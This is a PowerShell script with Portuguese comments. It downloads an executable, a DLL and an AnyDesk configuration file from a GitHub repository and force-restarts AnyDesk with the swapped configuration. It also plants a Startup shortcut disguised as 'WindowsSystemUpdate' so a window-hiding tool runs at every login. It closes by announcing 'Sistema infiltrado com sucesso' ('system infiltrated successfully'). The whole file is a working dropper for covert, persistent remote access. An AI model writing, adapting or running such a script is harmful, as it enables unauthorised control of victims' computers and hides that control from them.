# 1. DefiniÃ§Ãµes
$myFolder = "$env:AppData\Questions"
$anydeskDir = "$env:AppData\AnyDesk"
$startupPath = "$env:AppData\Microsoft\Windows\Start Menu\Programs\Startup"

# 2. Criar a pasta de trabalho se nÃ£o existir
if (!(Test-Path $myFolder)) { New-Item -ItemType Directory -Path $myFolder | Out-Null }

# 3. Baixar os ficheiros necessÃ¡rios (Tudo para a tua pasta)
$urls = @{
    "https://github.com/Questions2013/Private/raw/refs/heads/main/RBTray.exe" = "$myFolder\RBTray.exe"
    "https://github.com/Questions2013/Private/raw/refs/heads/main/RBHook.dll" = "$myFolder\RBHook.dll"
    "https://github.com/Questions2013/Private/raw/refs/heads/main/system.conf" = "$myFolder\system.conf"
}

Write-Host "A baixar os recursos..." -ForegroundColor Cyan
foreach ($url in $urls.Keys) {
    Invoke-WebRequest -Uri $url -OutFile $urls[$url]
}

# 4. Configurar o AnyDesk (VersÃ£o User-Mode)
if (Test-Path $anydeskDir) {
    Write-Host "A configurar o AnyDesk..." -ForegroundColor Cyan
    Stop-Process -Name "AnyDesk" -Force -ErrorAction SilentlyContinue
    Copy-Item -Path "$myFolder\system.conf" -Destination "$anydeskDir\system.conf" -Force
    Start-Process "C:\Program Files (x86)\AnyDesk\AnyDesk.exe" -ErrorAction SilentlyContinue
}

# 5. Criar o atalho no Startup (InvisÃ­vel/DisfarÃ§ado)
$shell = New-Object -ComObject WScript.Shell
$shortcut = $shell.CreateShortcut("$startupPath\WindowsSystemUpdate.lnk")
$shortcut.TargetPath = "$myFolder\RBTray.exe"
$shortcut.WorkingDirectory = $myFolder
$shortcut.Description = "Windows System Management Tool"
$shortcut.Save()

# 6. Executar o RBTray agora
Start-Process "$myFolder\RBTray.exe"

Write-Host "Deploy completo, Questions! Sistema infiltrado com sucesso." -ForegroundColor Green

